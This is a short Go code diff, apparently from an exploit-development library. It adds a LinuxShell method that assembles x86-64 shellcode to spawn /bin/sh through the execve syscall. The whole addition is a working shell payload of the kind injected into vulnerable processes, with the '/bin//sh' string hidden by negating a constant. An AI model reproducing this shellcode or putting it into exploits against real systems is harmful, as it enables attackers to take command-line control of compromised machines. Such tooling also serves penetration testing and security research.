@@ -100,3 +100,23 @@ executable:
 	configured = append(configured, payload...)
 	return configured, nil
 }
+
+// LinuxShell is a method for JIT compiling x86-64 shellcode that executes /bin/sh
+func (x8664 *X8664) LinuxShell() ([]byte, error) {
+	instrs := `
+    xor eax, eax
+    mov rbx, 0xFF978CD091969DD1
+    neg rbx
+    push rbx
+    push rsp
+    pop rdi
+    cdq
+    push rdx
+    push rdi
+    push rsp
+    pop rsi
+    mov al, 0x3b
+    syscall
+`
+	return sp.Asm(x8664.arch, instrs)
+}
